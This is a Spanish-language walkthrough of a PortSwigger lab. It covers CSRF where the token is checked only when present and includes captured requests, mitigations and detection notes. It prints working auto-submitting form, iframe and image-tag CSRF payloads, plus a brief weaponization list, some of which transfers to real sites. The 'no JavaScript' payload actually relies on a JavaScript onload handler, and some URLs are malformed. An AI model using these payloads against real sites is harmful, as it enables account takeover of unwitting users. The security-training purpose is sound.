
---

# CSRF con validación condicional del token

## 1. Introducción

En este laboratorio analizamos una vulnerabilidad de **Cross‑Site Request Forgery (CSRF)** provocada por una lógica incorrecta en la implementación del token anti‑CSRF.  
La aplicación únicamente valida el token si se incluye en la solicitud, lo que permite ejecutar acciones críticas sin proporcionar un valor válido.

El objetivo del ejercicio es construir un ataque CSRF que modifique la dirección de correo electrónico de la víctima eliminando el parámetro `csrf` de la petición.

[Ver laboratorio Portswigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

---

## 2. Contexto de la vulnerabilidad

La funcionalidad vulnerable corresponde a la actualización de correo en la cuenta del usuario autenticado.  
El formulario incluye un campo oculto:

```
<input type="hidden" name="csrf" value="XYZ">
```

La lógica del servidor es la siguiente:

- Si el parámetro `csrf` está presente: se valida
    
- Si el parámetro `csrf` NO está presente: se acepta la petición sin comprobar nada
    

Esta implementación parte de un supuesto inseguro:

> “Si no se recibe token, la petición es legítima”.

---

## 3. Análisis de la petición capturada

### 3.1 Petición legítima observada

Tras enviar el formulario, vemos una solicitud POST similar:

```
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net

email=test@example.com&csrf=ABC123
```

### 3.2 Manipulación del token en Repeater

- **Token incorrecto:**  
    Si alteramos el valor, el servidor rechaza la petición.
    
- **Token eliminado:**  
    Si eliminamos completamente el parámetro, el servidor acepta la petición y cambia el correo.
    

Este comportamiento confirma una **validación condicional del token**.

---

## 4. Construcción del ataque CSRF

Para explotar el fallo, debemos enviar una petición POST sin el parámetro `csrf`.

Si usamos **Burp Suite Community**, construimos manualmente el formulario HTML.

### 4.1 Payload de explotación

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victima@attacker.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

Observaciones:

- Omisión explícita del campo `csrf`
    
- Auto‑envío silencioso
    
- La víctima solo necesita cargar la página mientras esté autenticada
    

---

## 5. Publicación y verificación del exploit

1. Pegamos el HTML en el servidor de exploit
    
2. Guardamos y probamos con “View exploit”
    
3. Confirmamos el cambio en el correo
    
4. Modificamos el correo para que **no coincida con el nuestro**
    
5. Guardamos
    
6. “Deliver to victim” para resolver el laboratorio
    

---

## 6. Fundamentación del fallo

El núcleo del problema reside en confiar en la **presencia del parámetro** para determinar si la petición requiere validación.

En un sistema seguro:

- La ausencia de token → debe ser tratada como fallo
    
- La presencia de token → debe ser validada
    

En este caso:

- La ausencia de token → se trata como solicitud válida
    

Esto resulta en una vulnerabilidad CSRF trivial, explotable sin necesidad de conocer los tokens legítimos.

---

## 7. Conclusión

Este laboratorio demuestra cómo un control de seguridad mal implementado puede proporcionar una falsa sensación de protección.  
La aplicación contaba con tokens CSRF, pero su verificación era opcional, lo que anulaba por completo su propósito.

Un exploit básico permite modificar el correo del usuario sin esfuerzo, evidenciando:

- Importancia de validaciones obligatorias
    
- Riesgo de confiar en parámetros como indicador de legitimidad
    
- Explotación sencilla mediante HTML y auto‑submit
    

---

## 8. Mitigaciones

### 8.1 Implementación correcta del token CSRF

- Requerir siempre el token en todas las peticiones sensibles
    
- Rechazar si falta, es nulo o incorrecto
    

### 8.2 Tokens únicos y por sesión

- Tokens fuertes, impredecibles
    
- Asociados a sesión y caducidad
    

### 8.3 Validación de origen

- `SameSite=Lax` o `Strict`
    
- Verificación consistente de `Origin` / `Referer`
    

### 8.4 Endpoints diseñados para ser no explotables

- Usar métodos no idempotentes con token obligatorio
    
- No permitir side‑effects mediante GET
    

### 8.5 Medidas complementarias

- Re‑autenticación para cambios críticos
    
- Confirmación UI secundaria
    

---

## 9. Payloads alternativos

### 9.1 HTML sin JavaScript

Para entornos con JS desactivado:

```html
<body onload="document.forms[0].submit()">
<form method="POST" action="https://LAB-ID/web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@attacker.com">
</form>
</body>
```

### 9.2 Auto‑submit con iframe

Para cargas silenciosas:

```html
<iframe style="display:none" srcdoc='
<form method="POST" action="https://LAB-ID/...">
  <input type="hidden" name="email" value="foo@evil.com">
</form>
<script>document.forms[0].submit()</script>
'></iframe>
```

### 9.3 Explotación con imagen (cuando hay GET)

_(No aplica en este lab, pero útil en general)_

```html
<img src="https://target/change-email?email=pwned@evil.com">
```

### 9.4 Automatización

- cURL
    
- Python `requests`
    
- Burp Intruder
    

---

## 10. Notas de explotación

### 10.1 Detección

Posibles indicadores en logs:

- Cambios de email sin parámetro `csrf`
    
- Origen HTTP externo inesperado
    
- User‑agent distinto a navegación típica
    

### 10.2 Consideraciones operacionales

- Funciona incluso con SameSite=Lax si el usuario navega activamente
    
- Ataque silencioso, no requiere interacción adicional
    

### 10.3 Weaponización

- Iframe en páginas legítimas
    
- Redirecciones encadenadas
    
- Phishing minimalista
    

### 10.4 Limitaciones

- Requiere que la víctima esté autenticada
    
- Controles adicionales (captcha, 2FA) pueden bloquear el exploit
    

---
